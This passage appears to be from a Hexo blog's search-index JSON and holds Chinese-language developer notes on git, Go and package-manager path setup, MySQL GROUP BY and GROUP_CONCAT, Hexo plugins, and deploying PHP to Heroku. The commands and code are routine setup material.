force “git pull” to overwrite local files? - Stack Overflow</a></p>\n<p><code>git fetch --all</code> 是更新 “所有” remote 底下的分支</p>\n<p>但沒想到reset大法可以解決XD</p>\n<p>其他重點小記<br><a href=\"https://juejin.im/post/5985b9c56fb9a03c376de762\" target=\"_blank\" rel=\"noopener\">[译] 使用 <code>-force</code> 被认为是有害的；了解 Git 的 <code>-force-with-lease</code> 命令 - 掘金</a></p>\n","categories":["Git"],"tags":["git"]},{"title":"git還原commit時候檔案狀態","url":"/blog/2018/04/23/git%E9%82%84%E5%8E%9Fcommit%E6%99%82%E5%80%99%E6%AA%94%E6%A1%88%E7%8B%80%E6%85%8B/","content":"","categories":["git"],"tags":["git","checkout"]},{"title":"go安裝筆記&gopath環境變數設定","url":"/blog/2018/08/27/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/","content":"<p>最近想玩玩看GO<br>在ElementaryOS安裝GO<br>踩幾個雷，紀錄一下筆記<br>這次的雷還深深了解以前code設定環境變數用途<br><a id=\"more\"></a></p>\n<h2 id=\"apt-get-安裝GO\"><a href=\"#apt-get-安裝GO\" class=\"headerlink\" title=\"apt-get 安裝GO\"></a>apt-get 安裝GO</h2><p>我比較懶，所以選擇這個方式安裝<br>用<code>apt-get install golang-go</code><br>安裝完你會發現版本太舊<br>有些需要1.8版以上才能跑<br><code>apt-get install golang-1.10-go</code><br>記得這邊要加PATH環境變數<br><code>export PATH=&quot;$PATH:/usr/lib/go-1.10/bin</code><br>bash加在<code>~/.profile</code>或<code>~/.bashrc</code><br>zsh加在<code>.zshrc</code><br>之後有一篇會再講</p>\n<p>參考來源<br><a href=\"https://github.com/golang/go/wiki/Ubuntu\" target=\"_blank\" rel=\"noopener\">Ubuntu · golang/go Wiki</a></p>\n<h2 id=\"GOPATH\"><a href=\"#GOPATH\" class=\"headerlink\" title=\"GOPATH\"></a>GOPATH</h2><p>沒有權限使用，可以改這個環境變數</p>\n<blockquote>\n<p>Go 1.8 is introducing a default GOPATH. If you don’t set one, the tools will use the default. Default GOPATH is:<br>   $HOME/go on Unix-like systems<br>   %USERPROFILE%\\go on Windows<br><a href=\"https://rakyll.org/default-gopath/\" target=\"_blank\" rel=\"noopener\">The default GOPATH · Go, the unwritten parts</a></p>\n</blockquote>\n<p>原本以為會遇到這個問題<br>還有<code>GOROOT</code>可以設定GO目錄<br>不過我沒設定好像也能跑<br>所以就沒設定<br>詳細一些東西可以看裡面東西<br><a href=\"https://www.jianshu.com/p/4e699ff478a5\" target=\"_blank\" rel=\"noopener\">go环境变量配置 (GOROOT和GOPATH) - 简书</a></p>\n<h2 id=\"其他程式語言兩三事\"><a href=\"#其他程式語言兩三事\" class=\"headerlink\" title=\"其他程式語言兩三事\"></a>其他程式語言兩三事</h2><p>等等…，為什麼GOPATH就能解決權限問題<br>那…php,nodejs,沒有一樣設定的東西嗎</p>\n<h3 id=\"java-classpath\"><a href=\"#java-classpath\" class=\"headerlink\" title=\"java classpath\"></a>java classpath</h3><p>印象中…可以在環境變數先加classpath<br>不過這應該跟我們這篇沒關係<br>先跳過</p>\n<h3 id=\"nodejs-設定套件golbal存放位置\"><a href=\"#nodejs-設定套件golbal存放位置\" class=\"headerlink\" title=\"nodejs 設定套件golbal存放位置\"></a>nodejs 設定套件golbal存放位置</h3><p><code>npm config get prefix</code><br>可以抓到現在<code>npm install xxxx -g</code>存放路徑<br>Linux預設存放<br><code>/usr/</code><br><code>C:\\Users\\(User)\\AppData\\Roaming\\npm</code></p>\n<p>這邊我就很好奇，為什麼Linux可以執行<code>node</code>global為什麼可以在cmd上面打<br>原來那些路徑有設定到<code>PATH</code><br>LINUX會在<code>/usr/bin</code>加程式位置<br>所以你可以打指令執行</p>\n<p>所以你自訂<code>npm config set prefix ~/.npm-package</code><br>加完<del>不要高興太早</del>記得要在<code>$PATH</code>加入你npm設定位置<br>不然cmd呼叫不到<br><a href=\"https://blog.miniasp.com/post/2015/09/01/Change-npm-default-global-installation-directory-for-nodejs-modules-in-Windows.aspx\" target=\"_blank\" rel=\"noopener\">The Will Will Web | 如何在 Windows 平台變更 Node.js / npm 全域模組的預設安裝路徑</a></p>\n<p><code>npm install --prefix &lt;path/to/prefix_folder&gt; -g</code>好像能指定目錄安裝</p>\n<p><a href=\"https://github.com/npm/npm/issues/11007\" target=\"_blank\" rel=\"noopener\">npm install –prefix: still available? · Issue #11007 · npm/npm</a><br><a href=\"https://stackoverflow.com/questions/14469515/how-to-npm-install-to-a-specified-directory\" target=\"_blank\" rel=\"noopener\">node.js - How to npm install to a specified directory? - Stack Overflow</a></p>\n<p>更詳細介紹<a href=\"https://newsn.net/say/npm-whereis.html\" target=\"_blank\" rel=\"noopener\">npm的.npmrc文件在哪里？缓存及全局包文件在什么位置？</a><br>原來更改這些設定會寫入到<code>~/.npmrc</code>裡面</p>\n<h3 id=\"php-composer-global\"><a href=\"#php-composer-global\" class=\"headerlink\" title=\"php - composer  global\"></a>php - composer  global</h3><p>執行路徑會在composer 本目錄下<br>我沒有用過<br>先筆記<br><a href=\"https://stackoverflow.com/questions/25549177/change-composer-global-path-windows/25569354\" target=\"_blank\" rel=\"noopener\">php - Change composer global path (Windows) - Stack Overflow</a><br><a href=\"https://stackoverflow.com/questions/30664220/where-to-find-composers-global-packages\" target=\"_blank\" rel=\"noopener\">php - Where to find composer’s global packages? - Stack Overflow</a></p>\n<h3 id=\"python-pip\"><a href=\"#python-pip\" class=\"headerlink\" title=\"python pip\"></a>python pip</h3><p>這個就爬得很久…<br>apt-get預設安裝在root上面<br>所以很大機率pip安裝都要加root</p>\n<p><a href=\"http://yangl.net/2018/05/18/python-pip-usage/\" target=\"_blank\" rel=\"noopener\">python自定义安装python包－pip的使用-Bluesky’s blog</a></p>\n<blockquote>\n<p>用户目录下面，.pip目录下建立pip.conf文件，文件内容如下：<br>[install]<br>install-option=–prefix=~/.local<br>然后pip的库就安装到用户目录下的.local下面了<br><a href=\"http://yangl.net/2018/05/18/python-pip-usage/\" target=\"_blank\" rel=\"noopener\">python自定义安装python包－pip的使用-Bluesky’s blog</a></p>\n</blockquote>\n<p>這就沒有測試了…，奇怪這篇重點好像是GO<br>怎麼扯到別的程式語言呢XD</p>\n<p>最後最近玩GO<br>他的package跟別的程式語言差好多<br>看來有空還是簡單記一下<br><a href=\"https://yami.io/php-to-golang/\" target=\"_blank\" rel=\"noopener\">從 PHP 到 Golang 的筆記</a></p>\n","categories":["GO"],"tags":["go"]},{"title":"group by 和distinct不一樣的地方","url":"/blog/2018/05/17/group-by-%E5%92%8Cdistinct%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E5%9C%B0%E6%96%B9/","content":"<p>今天做專案，使用到select xxx,ooo ,zzzz from xxxx group by xxx,ooo 語句(沒有搭配統計)<br>發現跟我想像中怪怪的<br>平常使用都是用<br>一開始我以為會有重複資料<br>但結果沒有<br><a id=\"more\"></a></p>\n<p>不過發現執行結果跟distanct一樣事情<br>但我印象中db2不能這樣跑<br>db2一定要group by xxx,ooo,zzz才能跑<br>就算mysql做group by xxx,ooo跑出來的zzz也只有一個欄位<br>跑出來的zzz只會有一筆(假如有兩筆以上，不知道是不是照自然排序抓出來的)</p>\n<p>然後找不到db2語法<br>但還是有找到，其他DBMS都不能跑</p>\n<blockquote>\n<p>7) mysql的group by 語句可以select 沒有被分組的欄位，如<br>select id,name,age from A group by age 這樣<br>但是在orcale和sqlserver中是會報錯的。這個取出的id,name所在的行是每個分組中的第一行數據。<br><a href=\"http://www.zendei.com/article/9047.html\" target=\"_blank\" rel=\"noopener\">www.zendei.com | 502: Bad gateway</a><br><a href=\"http://webcache.googleusercontent.com/search?q=cache:x3Lgo0kwHvgJ:www.zendei.com/article/9047.html&amp;num=1&amp;lr=lang_zh-TW&amp;client=firefox-b-ab&amp;hl=zh-TW&amp;gl=tw&amp;tbs=lr:lang_1zh-TW&amp;strip=1&amp;vwsrc=0\" target=\"_blank\" rel=\"noopener\">你搞懂 ORACLE、 SQLSERVER、MYSQL與DB2的區別了嗎_ZenDei技術網路在線</a></p>\n</blockquote>\n<ul>\n<li><a href=\"https://sjq597.github.io/2016/04/24/Hive-group-by-distinct%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98/\" target=\"_blank\" rel=\"noopener\">Hive group by distinct性能调优 | LittleQ</a></li>\n<li><a href=\"https://academy.vertabelo.com/blog/group-by-clause-how-well-do-you-know-it-2/\" target=\"_blank\" rel=\"noopener\">GROUP BY Clause: How Well Do You Know It?</a></li>\n<li><a href=\"http://syunguo.blogspot.tw/2013/04/sqlgroup-by-distinct.html\" target=\"_blank\" rel=\"noopener\">Syun: [SQL]GROUP BY 與 DISTINCT 的差異</a></li>\n<li><a href=\"http://blog.51cto.com/ud1121/190562\" target=\"_blank\" rel=\"noopener\">Mysql group by 详解(写的比较详细)-贵子-51CTO博客</a></li>\n<li><a href=\"https://blog.csdn.net/zhwe357/article/details/18324097\" target=\"_blank\" rel=\"noopener\">DB2数据库DISTINCT与GROUP BY 对比 - CSDN博客</a></li>\n<li><a href=\"https://yq.aliyun.com/articles/530343\" target=\"_blank\" rel=\"noopener\">MySQL的四种GROUP BY用法-博客-云栖社区-阿里云</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Comparison_of_database_tools\" target=\"_blank\" rel=\"noopener\">Comparison of database tools - Wikipedia</a></li>\n</ul>\n","categories":["SQL"],"tags":["sql","MySQL","distinct"]},{"title":"GROUP_CONCAT 和 CONCAT_WS 多個橫欄和縱欄組在一起方法","url":"/blog/2019/09/02/group-cancat-%E5%92%8C-concat-ws-%E5%A4%9A%E5%80%8B%E6%A9%AB%E6%AC%84%E5%92%8C%E7%B8%B1%E6%AC%84%E7%B5%84%E5%9C%A8%E4%B8%80%E8%B5%B7%E6%96%B9%E6%B3%95/","content":"<p>之前有使用 group_concat ，但沒有特別做筆記<br>今天剛好查報表資料，就特別來筆記</p>\n<a id=\"more\"></a>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> oa.id,</span><br><span class=\"line\">       <span class=\"keyword\">GROUP_CONCAT</span>(<span class=\"keyword\">if</span>(a.xxx_group = <span class=\"number\">0</span> , <span class=\"literal\">NULL</span>,a.xxx_group)) <span class=\"keyword\">AS</span> xxx_group,</span><br><span class=\"line\">       <span class=\"keyword\">CONCAT_WS</span>(<span class=\"string\">','</span>,<span class=\"keyword\">IF</span>(f.a1,<span class=\"string\">'a1'</span>,<span class=\"literal\">NULL</span>),<span class=\"keyword\">IF</span>(f.a2,<span class=\"string\">'a2'</span>,<span class=\"literal\">NULL</span>),<span class=\"keyword\">IF</span>(f.a3,<span class=\"string\">'a3'</span>,<span class=\"literal\">NULL</span>)) <span class=\"keyword\">AS</span> <span class=\"string\">'a...'</span>,</span><br><span class=\"line\">       <span class=\"keyword\">IF</span>(a.xxx &gt; <span class=\"string\">''</span></span><br><span class=\"line\">          <span class=\"keyword\">OR</span> a.bbb &gt; <span class=\"string\">''</span>,<span class=\"string\">'Y'</span>,<span class=\"string\">'N'</span>) <span class=\"keyword\">AS</span> <span class=\"string\">'oo'</span>,</span><br><span class=\"line\">       <span class=\"keyword\">IF</span>(a.cc &gt; <span class=\"string\">''</span> ,<span class=\"string\">'Y'</span>,<span class=\"string\">'N'</span>) <span class=\"keyword\">AS</span> <span class=\"string\">'cc'</span></span><br><span class=\"line\"><span class=\"keyword\">FROM</span> a</span><br><span class=\"line\"><span class=\"keyword\">LEFT</span> <span class=\"keyword\">JOIN</span> b <span class=\"keyword\">ON</span> b = a.id</span><br><span class=\"line\"><span class=\"keyword\">LEFT</span> <span class=\"keyword\">JOIN</span> f <span class=\"keyword\">ON</span> f.xxx_id = a.id</span><br></pre></td></tr></table></figure>\n<h2 id=\"GROUP-CONCAT\"><a href=\"#GROUP-CONCAT\" class=\"headerlink\" title=\"GROUP_CONCAT\"></a>GROUP_CONCAT</h2><p>當初在 MySQL 看到這個函數有點大開眼界<br>因為 DB2 沒有看到類似的 function<br>但後來版本也有類似功能 <a href=\"https://stackoverflow.com/questions/7188542/db2-comma-separated-output\" target=\"_blank\" rel=\"noopener\">DB2 comma separated output - Stack Overflow</a></p>\n<p>簡單說明一下 GROUP_CONCAT<br>當初看到這個函數想說他能不能推回去(多列)<br>但是這不可能做到 <a href=\"https://dev.mysql.com/doc/refman/8.0/en/group-by-functions.html\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 8.0 Reference Manual :: 12.20.1 Aggregate (GROUP BY) Function Descriptions</a><br>看到 GROUP_CONCAT 歸類到 GROUP FUNCTION 我覺得不太可能…</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">GROUP_CONCAT([DISTINCT] expr [,expr ...]</span><br><span class=\"line\">[ORDER BY &#123;unsigned_integer | col_name | expr&#125;</span><br><span class=\"line\">[ASC | DESC] [,col_name ...]]</span><br><span class=\"line\">[SEPARATOR str_val])</span><br></pre></td></tr></table></figure>\n<p>使用搭配記得要加 GROUP BY</p>\n<p>但不知道有兩個欄位做 GROUP_CONCAT 不知道會不會有問題<br>改天再實驗</p>\n<h2 id=\"CONCAT-WS\"><a href=\"#CONCAT-WS\" class=\"headerlink\" title=\"CONCAT_WS\"></a>CONCAT_WS</h2><p>之前看到這個函示不知道這個用在哪裡<br>剛好資料要抓多欄資料合併成一欄…<br>我想到用<code>CONCAT_WS</code><br>我裡面包個IF 做 null判斷是預防抓到空字串轉<code>null</code>動作<br>轉null後就不會串到<code>,</code>裡面</p>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"Hello World","url":"/blog/2018/01/01/hello-world/","content":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n"},{"title":"hexo在blog貼圖","url":"/blog/2018/04/08/hexo%E5%9C%A8blog%E8%B2%BC%E5%9C%96/","content":"<p>hexo設定貼圖方法<br>在<br><figure class=\"highlight yml\"><figcaption><span>config.yml</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">post_asset_folder:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;% asset_path slug %&#125;</span><br><span class=\"line\">&#123;% asset_img slug [title] %&#125;</span><br><span class=\"line\">&#123;% asset_link slug [title] %&#125;</span><br></pre></td></tr></table></figure>\n<p>參考來源<br><a href=\"https://hexo.io/zh-tw/docs/asset-folders.html\" target=\"_blank\" rel=\"noopener\">資產資料夾 | Hexo</a></p>\n","categories":["寫程式一些事"],"tags":["hexo","img"]},{"title":"heroku 架設 PHP & Laravel  小記","url":"/blog/2019/06/30/heroku-%E6%9E%B6%E8%A8%AD-PHP-Laravel-%E5%B0%8F%E8%A8%98/","content":"<p>最近想寫一些程式放在網路上<br>但目前應該只有想測試程式用<br>網路有看到 Heroku<br>所以今天實作看看</p>\n<a id=\"more\"></a>\n<h2 id=\"官網教學\"><a href=\"#官網教學\" class=\"headerlink\" title=\"官網教學\"></a>官網教學</h2><p><a href=\"https://devcenter.heroku.com/articles/getting-started-with-php\" target=\"_blank\" rel=\"noopener\">Getting Started on Heroku with PHP | Heroku Dev Center</a></p>\n<ol>\n<li>準備</li>\n</ol>\n<ul>\n<li>heroku cli 安裝</li>\n<li>php</li>\n<li>composer</li>\n</ul>\n<ol start=\"2\">\n<li>cli 登入</li>\n</ol>\n<p><code>heroku login</code></p>\n<ol start=\"3\">\n<li>安裝測試 project</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/heroku/php-getting-started.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> php-getting-started</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>建制部屬分支</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">heroku create</span><br></pre></td></tr></table></figure>\n<p>在下這個指令之前<br>請看現在<code>git remote</code>分支<br>只會有一個 master<br>但是打了<code>heroku create</code><br>會多出一個分支，那個是部屬用的</p>\n<ol start=\"5\">\n<li>推送程式上去</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git push heroku master</span><br></pre></td></tr></table></figure>\n<ol start=\"6\">\n<li><code>heroku open</code>指令會跳出瀏覽器，可看到部屬成果</li>\n</ol>\n<p><strong>其實這邊算部屬完了</strong></p>\n<ol start=\"7\">\n<li>看 log</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">heroku logs --tail</span><br></pre></td></tr></table></figure>\n<ol start=\"8\">\n<li>Procfile 設定<br>其實看教學完後，我一直在想 Heroku 怎麼知道我不屬哪一個程式語言?<br>後來我看到這個，才知道為什麼 Heroku 能跑出我要的東西<br>為什麼自動部屬可以跑 composer?<br>我覺得應該是這個關係 <a href=\"https://github.com/heroku/heroku-buildpack-php/blob/master/bin/heroku-php-apache2\" target=\"_blank\" rel=\"noopener\">heroku-buildpack-php/heroku-php-apache2 at master · heroku/heroku-buildpack-php</a></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">web: vendor/bin/heroku-php-apache2 web/</span><br></pre></td></tr></table></figure>\n<ol start=\"9\">\n<li>更新現有程式內容</li>\n</ol>\n<p>這邊我就不詳細記錄了<br>文件建議 vendor 要加在.gititnore 裡面</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">composer require ...</span><br><span class=\"line\">composer update</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m <span class=\"string\">'demo'</span></span><br><span class=\"line\">git push heroku master</span><br><span class=\"line\">heroku open xxx</span><br></pre></td></tr></table></figure>\n<p>10 操作 heroku cli</p>\n<p>heroku run “php -a”</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">heroku run bash</span><br></pre></td></tr></table></figure>\n<ol start=\"11\">\n<li>設定環境變數</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">// 設定環境變數</span><br><span class=\"line\">heroku config:<span class=\"built_in\">set</span> TIMES=20</span><br><span class=\"line\">// 看 heroku env</span><br><span class=\"line\">heroku config</span><br></pre></td></tr></table></figure>\n<ol start=\"12\">\n<li>建置 Postgresql</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">heroku addons:create heroku-postgresql:hobby-dev</span><br></pre></td></tr></table></figure>\n<p>環境變數會多一個 <code>DATABASE_URL</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$dbopts = parse_url(getenv(<span class=\"string\">'DATABASE_URL'</span>));</span><br><span class=\"line\">$app-&gt;register(<span class=\"keyword\">new</span> Csanquer\\Silex\\PdoServiceProvider\\Provider\\PDOServiceProvider(<span class=\"string\">'pdo'</span>),</span><br><span class=\"line\">               <span class=\"keyword\">array</span>(</span><br><span class=\"line\">                <span class=\"string\">'pdo.server'</span> =&gt; <span class=\"keyword\">array</span>(</span><br><span class=\"line\">                   <span class=\"string\">'driver'</span>   =&gt; <span class=\"string\">'pgsql'</span>,</span><br><span class=\"line\">                   <span class=\"string\">'user'</span> =&gt; $dbopts[<span class=\"string\">\"user\"</span>],</span><br><span class=\"line\">                   <span class=\"string\">'password'</span> =&gt; $dbopts[<span class=\"string\">\"pass\"</span>],</span><br><span class=\"line\">                   <span class=\"string\">'host'</span> =&gt; $dbopts[<span class=\"string\">\"host\"</span>],</span><br><span class=\"line\">                   <span class=\"string\">'port'</span> =&gt; $dbopts[<span class=\"string\">\"port\"</span>],</span><br><span class=\"line\">                   <span class=\"string\">'dbname'</span> =&gt; ltrim($dbopts[<span class=\"string\">\"path\"</span>],<span class=\"string\">'/'</span>)</span><br><span class=\"line\">                   )</span><br><span class=\"line\">               )</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<p>網路也有茶道可以使用<a href=\"https://daimom3020.blogspot.com/2018/05/heroku-postgresql.html\" target=\"_blank\" rel=\"noopener\">Heroku 連線 Postgresql 教學 ~ 度估記事本</a><br>去做 DB 管理</p>\n<hr>\n<p>小記我 Heroku 有 rails 專案</p>\n<p>之前 2014 年有參加 rails 新手活動<br>結果我今天用都忘記我有用過這個…</p>\n<p>要怎麼把上面舊專案下載下來呢</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">heroku git:<span class=\"built_in\">clone</span> -a heroku_project</span><br></pre></td></tr></table></figure>\n<h2 id=\"Laravel\"><a href=\"#Laravel\" class=\"headerlink\" title=\"Laravel\"></a>Laravel</h2><p>之後 Laravel 架設可能需要調整到</p>\n<ol>\n<li><a href=\"https://www.itread01.com/content/1546353248.html\" target=\"_blank\" rel=\"noopener\">如何利用 Heroku 免費將本地 Laravel 專案部署到線上，已解決 - IT 閱讀</a></li>\n<li><a href=\"https://github.com/jessedc/laravel-heroku-example/blob/master/readme.md\" target=\"_blank\" rel=\"noopener\">laravel-heroku-example/readme.md at master · jessedc/laravel-heroku-example</a></li>\n<li><a href=\"https://learnku.com/articles/2602/how-to-quickly-use-heroku-to-deploy-your-laravel-application\" target=\"_blank\" rel=\"noopener\">如何快速使用 Heroku 来部署你的 Laravel 应用 | Laravel China 社区</a></li>\n</ol>\n<p>先記錄連結，有空寫寫我的部屬過程</p>\n<h2 id=\"更多-heroku-cli-指令\"><a href=\"#更多-heroku-cli-指令\" class=\"headerlink\" title=\"更多 heroku cli 指令\"></a>更多 heroku cli 指令</h2><p><a href=\"https://andyyou.github.io/2016/10/31/process-types-and-profile/\" target=\"_blank\" rel=\"noopener\">Heroku 運行類別、 Procfile、常用指令筆記 | DEVLOG of andyyou</a></p>\n","categories":["Heroku"],"tags":["heroku","deploy"]},{"title":"hexo裝上搜尋功能(local search)","url":"/blog/2018/08/05/hexo_search/","content":"<p>最近文章越來越多了<br>應該是時候加入收尋功能<br>有時找新文章真的太麻煩了<br>雖然很簡單還是筆記一下</p>\n<a id=\"more\"></a>\n<p>其實很簡單<br>簡單紀錄一下</p>\n<ol>\n<li>在hexo站點目錄下執行<code>npm install hexo-generator-searchdb --save</code></li>\n<li>Next主題config.yml設置<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Local search</span><br><span class=\"line\">local_search:</span><br><span class=\"line\">  enable: true</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>基本上這樣就可以了</p>\n<p>##遇到奇怪錯誤問題<br>怎麼點搜尋一直轉圈圈</p>\n<img src=\"/blog/2018/08/05/hexo_search/error.gif\" title=\"hexo_search不能搜尋\">\n<p>XML解析錯誤<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;entry&gt;</span><br><span class=\"line\">  &lt;title&gt;&lt;![CDATA[Android手機電源鍵壞掉，開機方法]]&gt;&lt;/title&gt;</span><br><span class=\"line\">  &lt;url&gt;%2Fblog%2F2018%2F05%2F19%2FAndroid%E6%89%8B%E6%A9%9F%E9%9B%BB%E6%BA%90%E9%8D%B5%E5%A3%9E%E6%8E%89%EF%BC%8C%E9%96%8B%E6%A9%9F%E6%96%B9%E6%B3%95%2F&lt;/url&gt;</span><br><span class=\"line\">  &lt;content type=&quot;text&quot;&gt;&lt;![CDATA[最近紅米NOTE3電源鍵壞了很久，但是平常可以指紋辨識解鎖有幾次不小心關機，但是強按還是有辦法開機但今天不行了….，剛好買新機想備份LINE，但是無法開機我Google尋了很多方法最終採取fastboot開機法 小米手机电源键坏了怎么办？怎么开机啊？安卓手机手机学院_脚本之家這一篇使用結果沒用 FastBoot 紅米NOTE3 進入方法 音量键- + 电源键 3秒但是…，電源鍵壞掉…無法使用不過可以插電源線充電插入時，按下音量鍵-可以進入fastboot模式 最後，[Linux] fastboot 用法學習歸納 - 代碼家1234sudo add-apt-repository ppa:nilarimogard/webupd8### 我沒有執行上面，發現內鍵可以安裝sudo apt-get updatesudo apt-get install android-tools-adb android-tools-fastboot 安裝FastBoot進入root，fastboot reboot你的手機就會重新開機 愉悅~~~ 手機設定畫面，第二章圖可以設定自動撥放 https://developers.google.com/web/updates/2017/09/autoplay-policy-changes\bhttps://times.hinet.net/news/21737359 [Linux] fastboot 用法學習歸納 - 代碼家adb &amp;amp; fastboot 常用指令 – HTC Flash Zone]]&gt;&lt;/content&gt;</span><br><span class=\"line\">    &lt;categories&gt;</span><br><span class=\"line\">      &lt;category&gt;Android&lt;/category&gt;</span><br><span class=\"line\">    &lt;/categories&gt;</span><br><span class=\"line\">    &lt;tags&gt;</span><br><span class=\"line\">      &lt;tag&gt;Android&lt;/tag&gt;</span><br><span class=\"line\">    &lt;/tags&gt;</span><br><span class=\"line\">&lt;/entry&gt;</span><br></pre></td></tr></table></figure></p>\n<p>我猜是我的文章有跟xml衝突到</p>\n<p>最後github issue看到<a href=\"https://github.com/wzpan/hexo-generator-search/issues/30\" target=\"_blank\" rel=\"noopener\">关于文章里有非 utf-8 格式的字符时，搜索会卡住 · Issue #30 · wzpan/hexo-generator-search</a><br>改成JSON格式就能解決了</p>\n<p>在hexo專案裡面config.yml(非主題裡面)<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># search</span><br><span class=\"line\">## [第三方服务集成 - NexT 使用文档](http://theme-next.iissnan.com/third-party-services.html#local-search)</span><br><span class=\"line\">search:</span><br><span class=\"line\">  path: search.json</span><br><span class=\"line\">  field: post</span><br><span class=\"line\">  format: html</span><br><span class=\"line\">  limit: 10000</span><br></pre></td></tr></table></figure></p>\n<p>最後無聊逛到<a href=\"http://muyunyun.cn/about/\" target=\"_blank\" rel=\"noopener\">| 牧之</a><br>網站裡面有一隻貓<br>是用<strong>hexo-helper-live2d</strong><br><a href=\"https://huaji8.top/post/live2d-plugin-2.0/\" target=\"_blank\" rel=\"noopener\">hexo live2d插件 2.0 ! | 幻想帖</a><br><a href=\"https://github.com/EYHN/hexo-helper-live2d\" target=\"_blank\" rel=\"noopener\">EYHN/hexo-helper-live2d: Add the Sseexxyyy live2d to your hexo!</a><br>先記錄一下</p>\n<p>參考來源:<br><a href=\"http://www.itfanr.cc/2017/10/27/add-search-function-to-hexo-blog/\" target=\"_blank\" rel=\"noopener\">Hexo博客添加搜索功能 | IT范儿</a><br><a href=\"http://theme-next.iissnan.com/third-party-services.html#local-search\" target=\"_blank\" rel=\"noopener\">第三方服务集成 - NexT 使用文档</a></p>\n","categories":["hexo"],"tags":["hexo","plugin"]},{"title":"hls影音串流小記","url":"/blog/2018/11/13/hls%E5%BD%B1%E9%9F%B3%E4%B8%B2%E6%B5%81%E5%B0%8F%E8%A8%98/","content":"<p>最近看到網頁上的影音，他播放的時候不會全下載<br>好奇就網頁爬了一下<br>是用 hls 技術，雖然現在還沒有用到<br>不過我還滿感一點興趣<br>就查一些記錄，筆記筆記</p>\n<a id=\"more\"></a>\n<ul>\n<li><a href=\"https://notfalse.net/63/m3u8-intro\" target=\"_blank\" rel=\"noopener\">M3U8 串流影音 - 概念 與 下載 - NotFalse 技術客</a></li>\n<li><a href=\"https://my.oschina.net/ososchina/blog/828100\" target=\"_blank\" rel=\"noopener\">流媒体：ffmpeg 生成 HLS 的 m3u8 与 ts 片段 - 小雨伞漂流记 - 开源中国</a></li>\n<li><a href=\"http://www.cnblogs.com/wainiwann/p/4128154.html\" 